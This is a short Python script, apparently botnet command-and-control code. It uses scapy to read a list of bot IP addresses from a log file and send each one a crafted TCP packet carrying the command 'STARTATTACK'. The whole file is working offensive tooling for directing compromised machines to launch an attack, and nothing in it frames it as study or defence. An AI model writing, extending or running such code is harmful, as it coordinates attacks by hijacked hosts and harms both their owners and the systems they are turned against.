from scapy.all import send, IP, TCP, Raw
import time

target_port = 9445
log_file = "/home/debian/request_ips.log"


def send_command_to_bots(command):
    try:
        with open(log_file, "r") as file:
            bot_ips = file.read().splitlines()
    except FileNotFoundError:
        print("Error: Bot IP log file not found.")
        return

    for bot_ip in bot_ips:
        payload = f"GET / HTTP/1.1\r\nHost: {bot_ip}\r\n\r\n{command}"
        packet = IP(dst=bot_ip) / TCP(dport=target_port, sport=12345, flags="PA") / Raw(load=payload)

        send(packet)
        print(f"Sent command '{command}' to {bot_ip}")
        time.sleep(1)  # Small delay to prevent network overload


if __name__ == "__main__":
    command = "STARTATTACK"
    print(f"Sending '{command}' to all bots...")
    send_command_to_bots(command)